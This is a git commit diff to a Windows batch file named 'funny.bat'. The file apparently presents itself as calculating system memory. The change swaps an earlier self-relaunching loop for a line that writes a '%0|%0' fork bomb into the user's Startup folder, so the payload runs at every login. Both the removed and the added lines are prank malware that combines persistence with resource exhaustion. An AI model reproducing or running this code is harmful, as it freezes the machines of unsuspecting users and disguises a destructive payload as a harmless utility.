6203cd58fdd890462f526ca16c94abebf7330e2a
frogillius <151787619+frogillius@users.noreply.github.com>
2024-06-11 21:29:43 -0700

    Update funny.bat

--- funny.bat
+++ funny.bat
@@ -1,13 +1,6 @@
 @echo off 
-echo :funny > funny.bat
-echo cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" >> funny.bat
-echo start funny.bat >> funny.bat
-echo goto :funny >> funny.bat
 cd "%AppData%/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
-echo :funny > funny.bat
-echo cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" >> funny.bat
-echo start funny.bat >> funny.bat
-echo goto :funny >> funny.bat
+echo %%0|%0% > funny.bat
 
 echo Calculating total system memory
 for /f "skip=1" %%p in ('wmic os get TotalVisibleMemorySize') do ( 
